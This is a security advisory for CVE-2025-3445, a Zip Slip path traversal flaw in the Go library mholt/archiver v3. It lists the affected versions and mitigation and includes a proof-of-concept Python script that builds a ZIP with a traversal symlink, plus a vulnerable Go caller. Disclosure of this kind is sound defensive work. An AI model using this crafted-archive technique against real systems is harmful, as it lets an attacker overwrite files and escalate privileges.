---
description: CVE-2025-3445 High severity. mholt/archiver Zip Slip Path Traversal
title: mholt/archiver Zip Slip Path Traversal
date_published: "2025-04-14"
last_updated: "2025-04-14"
xray_id:
vul_id: CVE-2025-3445
cvss: 8.1
severity: high
discovered_by: Ofri Ouzan
type: vulnerability
---
## Summary
This vulnerability allows the use of a crafted ZIP file containing path traversal symlinks to create or overwrite files with the privileges of the user or application utilizing the library.



## Component

[github.com/mholt/archiver/v3](https://github.com/mholt/archiver)



## Affected versions

[3.0.0,3.5.1]



## Description

A Zip Slip vulnerability has been identified in mholt/archiver in Go. This vulnerability allows the use of a crafted ZIP file containing path traversal symlinks to create or overwrite files with the privileges of the user or application utilizing the library.

When using the archiver.Unarchive functionality with ZIP files like this:
`archiver.Unarchive(zipFile, outputDir)`

A crafted ZIP file can be extracted in such a way that it writes files to the affected system with the same privileges as the application executing this vulnerable functionality. Consequently, sensitive files may be overwritten, potentially leading to privilege escalation, code execution, and other severe outcomes in some cases.

It is worth noting that a similar vulnerability has been identified in TAR files (CVE-2024-0406), which has yet to be officially fixed.
Also, we have observed the 0.1.0 release of the archives package in which the Unarchive() functionality has been removed from various parts of the project. However, the latest stable release that is currently available in the archiver package (v3.5.1) remains affected by this vulnerability.

## PoC

An example to create a crafted zip file that has symlinks with path traversal:

create_zip.py:
```
import zipfile
import os
import io

def create_zip(zip_path):
    with zipfile.ZipFile(zip_path, 'w') as zip_ref:
        symlink_target = '../../../here'
        symlink_info = zipfile.ZipInfo('./x')
        symlink_info.external_attr = 0o120777 << 16
        zip_ref.writestr(symlink_info, symlink_target)
        regular_file_content = b'Exploited!\n'
        zip_ref.writestr('./x', regular_file_content)

if __name__ == "__main__":
    zip_path = "exploit.zip"
    create_zip(zip_path)
    print(f"Zip file created at {zip_path} with the specific conditions.")
```


An example of a vulnerable application that uses the vulnerable `archiver.Unarchive()` functionality with a provided crafted zip file:

main.go:
```
package main

import (
    "fmt"
    "log"
    "github.com/mholt/archiver/v3"
)

func main() {
    zipFile := "exploit.zip"
    outputDir := "output_directory"
    err := archiver.Unarchive(zipFile, outputDir)
    if err != nil {
        log.Fatalf("Failed to unarchive %s: %v", zipFile, err)
    }
    fmt.Printf("Successfully extracted %s to %s\n", zipFile, outputDir)
}
```



## Vulnerability Mitigations

The https://github.com/mholt/archiver project is deprecated and replaced by the project https://github.com/mholt/archives which is not affected by this issue.
It is recommended to switch to this maintained library if possible.



## References

[Original advisory](https://github.com/mholt/archives/issues/27)